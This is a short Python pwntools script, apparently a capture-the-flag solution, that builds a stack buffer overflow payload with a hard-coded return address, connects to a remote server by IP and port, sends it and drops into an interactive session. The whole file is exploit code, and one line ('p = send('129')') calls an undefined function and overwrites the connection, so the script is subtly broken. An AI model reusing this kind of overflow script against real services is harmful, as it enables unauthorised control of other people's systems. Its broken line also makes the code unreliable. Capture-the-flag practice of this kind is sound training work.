from pwn import *
pay = b"A"*128
pay += b"A"*8
pay += b'\xb8\x07\x40\x00\x00\x00\x00'

p = remote("20.196.65.84", 40021)
p = send('129')
#p.sendafter('> ', '129')
p.sendafter(': ', pay)
p.interactive()